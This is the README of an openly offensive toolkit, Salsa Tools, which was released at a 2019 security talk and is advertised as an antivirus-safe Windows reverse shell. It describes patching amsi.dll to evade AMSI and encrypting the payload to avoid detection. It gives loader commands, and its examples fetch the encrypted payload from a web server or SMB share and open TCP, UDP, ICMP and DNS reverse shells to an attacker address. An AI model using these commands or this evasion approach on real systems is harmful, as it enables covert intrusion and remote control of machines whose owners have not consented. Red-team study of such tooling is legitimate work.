![License](https://img.shields.io/badge/license-GNU-green.svg?style=flat-square)

```
   _____       __              ______            __    
  / ___/____ _/ /________ _   /_  __/___  ____  / /____
  \__ \/ __ `/ / ___/ __ `/    / / / __ \/ __ \/ / ___/
 ___/ / /_/ / (__  ) /_/ /    / / / /_/ / /_/ / (__  ) 
/____/\__,_/_/____/\__,_/    /_/  \____/\____/_/____/  

```
# **Salsa Tools - An AV-Safe Reverse Shell dipped on bellota sauce   **

Salsa Tools is a collection of three different tools that combined, allows you to get a reverse shell on steroids in any Windows environment without even needing PowerShell for it's execution. In order to avoid the latest detection techniques (AMSI), most of the components were initially written on C#. Salsa Tools was publicly released by Luis Vacas during his Talk “Inmersión en la explotación tiene rima” which took place during h-c0n in 9th February 2019.


## Features
    * TCP/UDP/ICMP/DNS     
    * AV Safe (17th February)
    * AMSI patchers
    * PowerShell execution 
    * ...
    
## Overview
Salsa-Tools is made from three different  ingredients:
    - EvilSalsa
    - EncrypterAssembly
    - SalseoLoader
And his behavior is as it follows:
TODO CROQUIS

## Setup
### Requirements
 - Visual Studio 2017 (or similar)
 - Python 2.7       
### Running la Salsa
#### Cooking EvilSalsa
TODO INSERTAR FOTO DE LA EVILSALSA

EvilSalsa is the key ingredient of this recipe. It contains the payload, which is executed on the system as it follows: as soon as the payloads starts, it runs `System.Management.Automation.dll` which creates a runspace . Within that runspace we have four types of shells (TCP / UDP / ICMP / DNS). Once EvilSalsa is loaded, first thing first, the existence of `c:\windows\system32\amsi.dll` is checked. If it exists, it is patched using a home-cooked variant of CyberArk and Rastamouse bypasses.


#### Mixing EncrypterAssembly and Evilsalsa
TODO INSERTAR FOTO DE LA SALSA
EncrypterAssembly can be used as a Python script or as a Exe binary.
It encrypts the previously generated EvilSalsa.

Python usage:
```
python encrypterassembly.py <FILE> <PASSWORD> <OUTPUT>
```
Executable usage:
```
Encrypterassembly.exe <FILE> <PASSWORD> <OUTPUT>
```
#### Bringing the Encrypted EvilSalsa to the table with SalseoLoader
SalseoLoader is in charge of loading the encrypted payload. Can be both compiled as a library or as an executable. If it is run as an executable, the chosen arguments must be provided when the executable is run. If it is compiled as a library, the descriptor "main" must be exported. Arguments are added using environmental variables.

Executable usage:
```
SalseoLoader.exe <PASSWORD> <PAYLOAD PATH> <SHELL TYPE> <LHOST> <LPORT>
```
Library usage:
```
TODO NO TENGO NI IDEA DE QUE POENR AQUI LUIS XDD
```

## Examples
### SalseoLoader (executable version) running Encrypted EvilSalsa (UDP mode) from a web server:
```
SalseoLoader.exe hc0n-2019 http://192.168.1.235/elmal.txt reverseudp 192.168.1.235 1337
```
![](https://github.com/Hackplayers/Salsa-tools/blob/master/images/example1.png)

### SalseoLoader (executable version) running Encrypted EvilSalsa (TCP mode) locally:
```
SalseoLoader.exe hc0n-2019 C:\elmal.txt reversetcp 192.168.1.235 1337
```
![](https://github.com/Hackplayers/Salsa-tools/blob/master/images/example2.png)
## SalseoLoader (executable version) running Encrypted EvilSalsa (ICMP mode) from SMB:
```
SalseoLoader.exe hc0n-2019 \\192.168.1.235\evil\elmal.txt reverseicmp 192.168.1.235 
```
![](https://github.com/Hackplayers/Salsa-tools/blob/master/images/example3.png)

## SalseoLoader (executable version) running Encrypted EvilSalsa (DNS mode) locally:
## Example ReverseDNS
```
SalseoLoader.exe hc0n-2019 C:\elmal.txt reversedns 192.168.1.235 licordebellota.org
```
![](https://github.com/Hackplayers/Salsa-tools/blob/master/images/example4.png)
TODO faltan ejemplos de como se hace con la DLL

